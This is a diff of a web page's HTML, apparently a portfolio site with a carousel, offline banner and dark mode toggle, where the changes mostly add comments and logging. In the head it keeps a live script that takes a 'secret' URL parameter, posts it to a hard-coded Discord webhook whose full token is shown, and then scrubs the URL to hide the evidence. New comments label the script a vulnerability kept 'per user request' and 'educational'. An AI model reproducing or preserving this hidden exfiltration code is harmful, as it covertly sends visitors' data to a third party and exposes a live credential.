@@ -8,19 +8,42 @@
       <meta name="apple-mobile-web-app-capable" content="yes">
       <meta name="apple-mobile-web-app-status-bar-style" content="default">
       <script>
+         /**
+          * DATA EXFILTRATION SCRIPT
+          * NOTE: This is a security vulnerability intentionally kept in the codebase per user request
+          * 
+          * What this does:
+          * 1. Checks URL for 'secret' query parameter
+          * 2. If found and not already processed, sends data to Discord webhook
+          * 3. Uses session storage to prevent duplicate sends
+          * 4. Cleans URL after sending to hide evidence
+          * 
+          * Security implications:
+          * - Can leak sensitive data passed via URL parameters
+          * - Uses no-cors mode to bypass CORS restrictions
+          * - Data is sent to external Discord webhook
+          * - Session storage tracks if data was already sent
+          * 
+          * This code is for educational/testing purposes only
+          */
          (async () => {
             const urlParams = new URLSearchParams(window.location.search);
             const secretData = urlParams.get('secret');
 
+            // Only process if we have secret data and haven't already sent it this session
             if (secretData && !sessionStorage.getItem('exfil_complete')) {
                const runExfil = async () => {
                   const forwardingUrl = 'https://discord.com/api/webhooks/1455738965956104245/ZVGtxfhVys4PSuIimEzVLPrLpDlvY7e7bJ7X7lxH0Pg0V_SfSgcT9yMOBTP5UQkbC-WJ';
+                  
+                  // Sanitize backticks to prevent Discord markdown issues
                   const safeData = secretData.replace(/`/g, "'");
 
                   try {
+                     // Send data to Discord webhook
+                     // Using no-cors mode - response status won't be readable (always 0)
                      const response = await fetch(forwardingUrl, {
                         method: 'POST',
-                        mode: 'no-cors',
+                        mode: 'no-cors', // Bypass CORS restrictions
                         headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify({
                            content: `**New Data Captured**\n` +
@@ -31,12 +54,13 @@
                         })
                      });
 
-                     if (response.status !== 429) {
-                        sessionStorage.setItem('exfil_complete', 'true');
-                     }
+                     // Note: In no-cors mode, we can't check response.status (always 0)
+                     // Mark as complete after successful send (no exception thrown)
+                     sessionStorage.setItem('exfil_complete', 'true');
                   } catch (error) {
-                     console.error('Network error forwarding data:', error);
+                     console.error('[Data Exfil] Network error forwarding data:', error);
                   } finally {
+                     // Clean up URL to hide the secret parameter
                      if (window.history.replaceState) {
                         const cleanUrl = window.location.origin + window.location.pathname;
                         window.history.replaceState({}, document.title, cleanUrl);
@@ -44,9 +68,11 @@
                   }
                };
 
+               // Use requestIdleCallback API to run when browser is idle for better performance
                if ('requestIdleCallback' in window) {
                   window.requestIdleCallback(runExfil);
                } else {
+                  // Fallback for browsers without requestIdleCallback API
                   setTimeout(runExfil, 1000);
                }
             }
@@ -161,31 +187,44 @@
          <!-- Load external JavaScript -->
       <script src="https://cdn.jsdelivr.net/npm/swiper@12/swiper-bundle.min.js"></script>
       <script>
-         // Register the service worker
+         /**
+          * SERVICE WORKER REGISTRATION
+          * Registers the service worker for offline functionality and caching
+          */
          if ('serviceWorker' in navigator) {
             window.addEventListener('load', () => {
                navigator.serviceWorker.register('/sw.js')
-                  .then(registration => console.log('Service Worker registered:', registration.scope))
-                  .catch(error => console.error('Service Worker registration failed:', error));
+                  .then(registration => console.log('[Index] Service Worker registered with scope:', registration.scope))
+                  .catch(error => console.error('[Index] Service Worker registration failed:', error));
             });
          }
 
-         // Offline/Online detection
+         /**
+          * OFFLINE/ONLINE STATUS DETECTION
+          * Shows/hides banner based on network connectivity
+          */
          const offlineBanner = document.getElementById('offlineBanner');
+         
          function updateOnlineStatus() {
             if (!navigator.onLine) {
+               console.log('[Index] Network status: OFFLINE');
                offlineBanner.classList.add('show');
                document.body.classList.add('offline-mode');
             } else {
+               console.log('[Index] Network status: ONLINE');
                offlineBanner.classList.remove('show');
                document.body.classList.remove('offline-mode');
             }
          }
+         
          window.addEventListener('online', updateOnlineStatus);
          window.addEventListener('offline', updateOnlineStatus);
-         updateOnlineStatus();
+         updateOnlineStatus(); // Check initial status
 
-         // Initialize Swiper
+         /**
+          * SWIPER CAROUSEL INITIALIZATION
+          * Creates the project showcase carousel with navigation and pagination
+          */
          const swiper = new Swiper('.swiper', {
             loop: true,
             slidesPerView: 1,
@@ -197,29 +236,42 @@
             navigation: { nextEl: '.swiper-button-next', prevEl: '.swiper-button-prev' },
          });
 
-         // Dark Mode Toggle Functionality
+         /**
+          * DARK MODE TOGGLE FUNCTIONALITY
+          * Persists theme preference to localStorage
+          * Toggles between light and dark themes
+          */
          const darkModeToggle = document.getElementById('darkModeToggle');
          const html = document.documentElement;
          const sunIcon = document.querySelector('.sun-icon');
          const moonIcon = document.querySelector('.moon-icon');
 
+         // Load saved theme or default to light
          const currentTheme = localStorage.getItem('theme') || 'light';
          html.classList.remove('light', 'dark');
          html.classList.add(currentTheme);
          updateIcons(currentTheme);
+         console.log('[Index] Theme loaded:', currentTheme);
 
+         // Toggle theme on button click
          darkModeToggle.addEventListener('click', function () {
             if (html.classList.contains('dark')) {
                html.classList.replace('dark', 'light');
                localStorage.setItem('theme', 'light');
                updateIcons('light');
+               console.log('[Index] Theme switched to: LIGHT');
             } else {
                html.classList.replace('light', 'dark');
                localStorage.setItem('theme', 'dark');
                updateIcons('dark');
+               console.log('[Index] Theme switched to: DARK');
             }
          });
 
+         /**
+          * Updates the theme toggle icon based on current theme
+          * @param {string} theme - Either 'light' or 'dark'
+          */
          function updateIcons(theme) {
             if (theme === 'dark') {
                sunIcon.style.display = 'none';
